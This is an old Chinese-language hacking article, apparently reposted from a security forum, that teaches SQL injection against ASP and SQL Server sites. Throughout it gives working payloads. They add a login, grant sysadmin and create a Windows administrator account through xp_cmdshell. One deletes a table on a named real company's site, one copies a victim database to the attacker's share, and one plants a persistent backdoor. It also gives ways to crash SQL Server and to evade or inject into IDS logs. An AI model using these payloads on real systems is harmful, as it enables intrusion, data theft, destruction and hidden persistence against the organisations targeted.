---
title: "SQL数据库的一些攻击"
date: 2001-08-24T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-254"
---

[inburst](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=2721) (inburst_at_263.net)

SQL数据库的一些攻击


Hectic 


[h4]关于数据库的简单入侵和无赖破坏，以天融信做例子[/h4]


对于国内外的很多新闻，BBS和电子商务网站都采用ASP+SQL设计，而写 ASP的程序员很多（有很多刚刚毕业的），所以，ASP+SQL的攻击成功率


也比较高。这类攻击方法与NT的版本和SQL的版本没有多大的关系，也没有相应的补丁，因为漏洞是程序员自己造成的，而且大多数讲解ASP编


程的书上，源代码例子就有这个漏洞存在，其实只是一些合法的ASP对SQL的请求，就留下后患无穷！   

这种攻击方法最早源于'or'1'='1的漏洞（我们暂且称其为漏洞），这个漏洞的原理我想大家因该都知道了，那么随之而来的便是;exec 


sp_addlogin hax（在数据库内添加一个hax用户），但是这个方法的限制很大，首先ASP使用的SQL Server账号是个管理员，其次请求的提交变


量在整个SQL语句的最后，因为有一些程序员采用SELECT * FROM news WHERE id=... AND topic=... AND .....   

这种方法请求数据库，那么如果还用以上的例子就会   

news.asp?id=2;exec sp_addlogin hax   

变成SELECT * FROM news WHERE id=2;exec sp_addlogin hax AND topic=... AND ...   

整个SQL语句在执行sp_addlogin的存储过程后有AND与判断存在，语法错误，你的sp_addlogin自然也不能正常运行了，因此试试看下面这个方


法   

news.asp?id=2;exec sp_addlogin hax;--   

后面的--符号把sp_addlogin后的判断语句变成了注释，这样就不会有语法错误了，sp_addlogin正常执行！   

那么我们连一起来用吧   

news.asp?id=2;exec master.dbo.sp_addlogin hax;--   

news.asp?id=2;exec master.dbo.sp_password null,hax,hax;--   

news.asp?id=2;exec master.dbo.sp_addsrvrolemember sysadmin hax;--   

news.asp?id=2;exec master.dbo.xp_cmdshell 'net user hax hax /workstations:* /times:all /passwordchg:yes /passwordreq:yes 


/active:yes /add';--   

news.asp?id=2;exec master.dbo.xp_cmdshell 'net localgroup administrators hax /add';--   

这样，你在他的数据库和系统内都留下了hax管理员账号了   

当然，前提条件是ASP用管理员账号，所以虚拟空间大家就别试了，不会存在这个漏洞的。   

以后我们会讨论，如果对方的ASP不是用SQL管理员账号，我们如何入侵，当然也会涉及到1433端口的入侵   

当然大家可以试试看在id=2后面加上一个'符号，主要看对方的ASP怎么写了   

   


再说说当ASP程序使用的SQL账号不是管理员的时候我们该如何做。   

你如天融信的主页，有新闻内容，如下：   

[http://www.talentit.com.cn/news/news-2.asp?newid=117  ](http://www.talentit.com.cn/news/news-2.asp?newid=117�0�2�0�2) 

大家可以试试看[http://www.talentit.com.cn/news/news-2.asp?newid=117;select](http://www.talentit.com.cn/news/news-2.asp?newid=117;select) 123;--   

呵呵，报语法错误，select 123错误，显而易见，天融新的ASP在newid变量后面用'号结束   

那么试试看[http://www.talentit.com.cn/news/news-2.asp?newid=117';delete](http://www.talentit.com.cn/news/news-2.asp?newid=117) news;--   

哈哈，我想只要表名猜对了，新闻库就被删了   


通常ASP用的SQL账号就算不是管理员也会是某个数据库的owner,至少对于这个库有很高的管理权限   

但是我们不知道库名该怎么？看看db_name()函数吧   

打开你的query analyzer，看看print db_name() ，呵呵，当前的数据库名就出来了   

以次类推，如下： declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--   

呵呵，他的当前数据库就备份到你的硬盘上了，接下来要做的大家心里都明白了吧   

同理这个方法可以找到对方的SQL的IP   

先装一个防火墙，打开ICMP和139TCP和445TCP的警告提示   

然后试试看news.asp?id=2;exec master.dbo.xp_cmdshell 'ping 你的IP'   

如果防火墙提示有人ping你，那么因该可以肯定对方的ASP用的是SQL的管理员权限，同时也确定了对方的SQL Server的准确位置，因为很多大


一点的网站考虑性能，会吧web服务和数据库分开，当对方大上了补丁看不到源代码时，我想只有这个方法能很快的定位对方的SQL Server的位


置了   

那么，如果对方ASP没有SQL管理员权限，我们就不能调用xp_cmdshell了，该怎么办？   

别着急，试试看这个news.asp?id=2;declare @a;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' 


,name='test';--   

呵呵，你的防火墙该发出警告了，有人连接你的445或139(win9端口了，这样，对方的SQL的ip一样也可以暴露   

那么如果对方连某个数据库的owner也不是的话，我们该怎么办？下次我会告诉大家一个更好的办法。   

其实backuo database到你的硬盘还是有点夸张了，如果对方数据库很庞大，你又是拨号上网，呵呵，劝你别试了，很难成功传输的   

下次我们还会谈到如何骗过IDS执行ASP+SQL入侵   

目前有些好的IDS已经开始监视xp_cmdshell这些关键字了   

好吧，同志们下次见   


所有以上url希望大家通过vbscript提交，因为浏览器的地址栏会屏蔽一些特殊字符，这样你的命令就不能完整传输了   

window.location.herf=URL 


补充：这个问题以前载网上也提出来过，但是只是一些简单的xp_cmdshell调用限制很大，其实这里面还有很多值得深入的地方比如


[www.guosen.com.cn](http://www.guosen.com.cn/)。国信证卷就有这个问题，而且他们采用ms的三层结构作的用以前说的xp_cmdshell做法就不行了，字符串会被过滤，但是


我尝试了，用sql的异类请求仍然可以在对方的机器上开启telnet服务和administrators组的账号！由于对方防火墙很严checkpoint数据报进出


都只开放80端口因此，要想获得他的数据库结构比较困难了，但是还是有办法可以做到的：P

顺便提醒大家注意一下关于sqloledb,db_name,openrowset,opendatasource这些系统函数当asp的sqlserver账号只是一个普通用户时，他们会


很有用的！

  

[h4]sql server新漏洞和一些突破口[/h4]


下面我要谈到一些sqlserver新的bug，虽然本人经过长时间的努力，当然也有点幸运的成分在内,才得以发现，不敢一个人独享，拿出来请大家


鉴别,当然很有可能有些高手早已知道了，毕竟我接触sqlserver的时间不到1年：P 


1。关于openrowset和opendatasource 

可能这个技巧早有人已经会了，就是利用openrowset发送本地命令 

通常我们的用法是（包括MSDN的列子）如下 

select * from openrowset('sqloledb','myserver';'sa';'','select * from table') 

可见（即使从字面意义上看)openrowset只是作为一个快捷的远程数据库访问，它必须跟在select后面，也就是说需要返回一个recordset 

那么我们能不能利用它调用xp_cmdshell呢？答案是肯定的！ 

select * from openrowset('sqloledb','server';'sa';'','set fmtonly off exec master.dbo.xp_cmdshell ''dir c:\''') 

必须加上set fmtonly off用来屏蔽默认的只返回列信息的设置，这样xp_cmdshell返回的output集合就会提交给前面的select显示，如果采用


默认设置，会返回空集合导致select出错，命令也就无法执行了。 

那么如果我们要调用sp_addlogin呢，他不会像xp_cmdshell返回任何集合的，我们就不能再依靠fmtonly设置了，可以如下操作 

select * from openrowset('sqloledb','server';'sa';'','select ''OK!'' exec master.dbo.sp_addlogin Hectic') 

这样，命令至少会返回select 'OK!'的集合，你的机器商会显示OK!，同时对方的数据库内也会增加一个Hectic的账号，也就是说，我们利用


select 'OK!'的返回集合欺骗了本地的select请求，是命令能够正常执行，通理sp_addsrvrolemember和opendatasource也可以如此操作！至于


这个方法真正的用处，大家慢慢想吧：P 


2。关于msdasql两次请求的问题 

不知道大家有没有试过用msdasql连接远程数据库，当然这个api必须是sqlserver的管理员才可以调用，那么如下 

select * from openrowset('msdasql','driver={sql 


server};server=server;address=server,1433;uid=sa;pwd=;database=master;network=dbmssocn','select * from table1 select * from 


table2') 

当table1和table2的字段数目不相同时，你会发现对方的sqlserver崩溃了，连本地连接都会失败，而系统资源占用一切正常，用pskill杀死


sqlserver进程后，如果不重启机器，sqlserver要么无法正常启动，要么时常出现非法操作，我也只是碰巧找到这个bug的，具体原因我还没有


摸透，而且很奇怪的是这个现象只出现在msdasql上，sqloledb就没有这个问题，看来问题不是在于请求集合数目和返回集合数目不匹配上，因


该还是msdasql本身的问题，具体原因，大家一起慢慢研究吧：P 


3。可怕的后门 

以前在网上看到有人说在sqlserver上留后门可以通过添加triger,jobs或改写sp_addlogin和sp_addsrvrolemember做到，这些方法当然可行，


但是很容易会被发现。不知道大家有没有想过sqloledb的本地连接映射。呵呵，比如你在对方的sqlserver上用sqlserver的管理员账号执行如


下的命令 

select * from openrowset('sqloledb','trusted_connection=yes;data source=Hectic','set fmtonly off exec master..xp_cmdshell 


''dir c:\''') 

这样在对方的sqlserver上建立了一个名为Hectic的本地连接映射，只要sqlserver不重启，这个映射会一直存在下去，至少我现在还不知道如


何发现别人放置的连接映射 

，好了，以上的命令运行过后，你会发现哪怕是sqlserver没有任何权限的guest用户，运行以上这条命令也一样能通过！而且权限是


localsystem！（默认安装）呵呵！这个方法可以用来在以被入侵过获得管理员权限的sqlserver上留下一个后门了。 


以上的方法在sqlserver2000+sqlserver2000SP1上通过！ 


*另外还有一个猜测，不知道大家有没有注意过windows默认附带的两个dsn，一个是localserver一个是msqi，这两个在建立的时候是本地管理


员账号连接sqlserver的，如果对方的sqlserver是通过自定义的power user启动，那么sa的权限就和power user一样，很难有所大作为，但是


我们通过如下的命令 

select * from openrowset('msdasql','dsn=locaserver;trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''dir 


c:\''')应该可以利用localserver的管理员账号连接本地sqlserver然后再以这个账号的权限执行本地命令了，这是后我想应该能突破sa那个


power user权限了。现在的问题是sqloledb无法调用dsn连接，而msdasql非管理员不让调用，所以我现在正在寻找guest调用msdasql的方法，


如果有人知道这个bug如何突破，或有新的想法，我们可以一起讨论一下，这个发放如果能成功被guest利用，将会是一个很严重的安全漏洞。


因为我们前面提到的任何sql语句都可以提交给对方的asp去帮我们执行：P 


[h4]利用t-sql骗过ids或攻击ids[/h4]


现在的ids已经变得越来越聪明了

有的ids加入了xp_cmdshell sp_addlogin 的监视

但是毕竟人工智能没有出现的今天，这种监视总是有种骗人的感觉

先说说欺骗ids:

ids既然监视xp_cmdshell关键字，那么我们可以这么做

declare @a sysname set @a="xp_"+"cmdshell" exec @a 'dir c:\'

这个代码象性大家都能看明白，还有xp_cmdshell作为一个store procedure在master库内有一个id号，固定的，我们也可以这么做

假设这个id=988456

declare @a sysname select @a=name from sysobjects where id=988456 exec @a 'dir c:\'

当然也可以

declare @a sysname select @a=name from sysobjects where id=988455+1 exec @a 'dir c:\'

这种做法排列组合，ids根本不可能做的到完全监视

同理，sp_addlogin也可以这么做

再说说攻击ids:

因为ids数据量很大，日至通常备份到常规数据库，比如sql server

如果用古老的recordset.addnew做法，会严重影响ids的性能，因为通过ado做t-sql请求，不但效率高，而且有一部分工作可以交给sql server


去做

通常程序会这么写

insert table values ('日至内容',...)

那么我么想想看，如果用

temp') exec xp_cmdshell 'dir c:\' --

提交后会变成

insert table values ('日至内容'....'temp') exec xp_cmdshell 'dir c:\' -- ')

这样，xp_cmdshell就可以在ids的数据库运行了 ：）

当然ids是一个嗅叹器，他会抓所有的报，而浏览器提交的时候会把空格变成%20

因此，%20会被提交到sql server，这样你的命令就无法执行了

唯一的办法就是

insert/**/table/**/values('日至内容'....'temp')/**/exec/**/xp_cmdshell/**/'dir c:\'/**/-- ')

用/**/代替空格做间隔符，这样你的t-sql才能在ids的数据库内执行

淡然也可以用其他语句，可以破坏，备份ids的数据库到你的共享目录

呵呵

其实这种方法的原理和攻击asp是一样的，只是把空格变成了/**/

本来asp是select语句，那么用'就可以屏蔽

现在ids用insert语句，那么用')屏蔽

 

好了，其他很多新的入侵语句大家可以自己慢慢想，最好的测试工具就是query analyzer了。
